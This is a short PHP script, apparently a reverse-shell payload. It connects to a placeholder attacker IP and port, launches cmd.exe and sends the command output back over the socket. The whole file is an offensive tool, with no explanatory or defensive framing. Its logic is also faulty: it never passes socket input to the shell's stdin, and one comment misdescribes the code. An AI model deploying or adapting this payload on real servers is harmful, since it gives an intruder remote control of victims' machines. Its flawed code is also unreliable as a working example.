<?php
$ip = 'YOUR_IP';  // Change to your IP address
$port = YOUR_PORT;  // Change to your listener port

$sock = fsockopen($ip, $port);
$cmd = 'cmd.exe';
$descriptorspec = array(
  0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
  1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
  2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);
$process = proc_open($cmd, $descriptorspec, $pipes);

if (is_resource($process)) {
  // Give all pipes to the target
  while ($f = fgets($pipes[1])) {
    fwrite($sock, $f);
    fflush($sock);
  }
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);
}
?>